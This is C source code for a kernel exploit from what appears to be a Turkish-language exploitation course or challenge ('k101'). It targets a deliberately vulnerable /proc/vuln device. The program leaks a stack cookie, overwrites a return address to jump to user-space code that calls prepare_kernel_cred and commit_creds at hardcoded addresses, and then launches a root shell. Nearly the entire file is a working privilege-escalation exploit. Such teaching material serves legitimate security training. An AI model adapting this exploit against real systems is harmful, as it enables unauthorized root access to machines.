/*
 *
 *  k101 | final exploit
 *  ###################################
 *  Bu challenge sonunda beraber inşa edeceğimiz 
 *  exploit'in kaynak kodudur, derlemek için make 
 *  aracını kullanabilirsiniz
 *
 */

#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>

#define DEVICE "/proc/vuln"
#define CMD    "/bin/sh"

void root(void)
{

  __asm__(
  ".intel_syntax noprefix;"
  "movabs rax, 0xffffffff81094a50;" //prepare_kernel_cred
  "xor rdi, rdi;"
  "call rax; mov rdi, rax;"
  "movabs rax, 0xffffffff810947b0;" //commit_creds
  "call rax;"
  ".att_syntax;"
  );

}

int main()
{

  int fd = open(DEVICE, O_RDWR);
  
  unsigned long w[3];
  unsigned long r[5];

  bzero(w, sizeof(w));
  bzero(r, sizeof(r));

  read(fd, r, sizeof(r));
  for(int i = 0; i < sizeof(r)/8; i++){
    printf("[*] Reading (%d): %lx\n", i, r[i]);
  }
  printf("[+] Cookie leaked! %lx\n", r[4]);

  w[1] = r[4];
  w[2] = (unsigned long)&root;

  puts("[*] Writing the payload to "DEVICE);
  write(fd, w, sizeof(w));
  close(fd);

  if(getuid()!=0){
    puts("[-] Exploit failed :(\n");
    return 1;
  }

  puts("[*] Running the command");
  system(CMD);

  return 0;

}
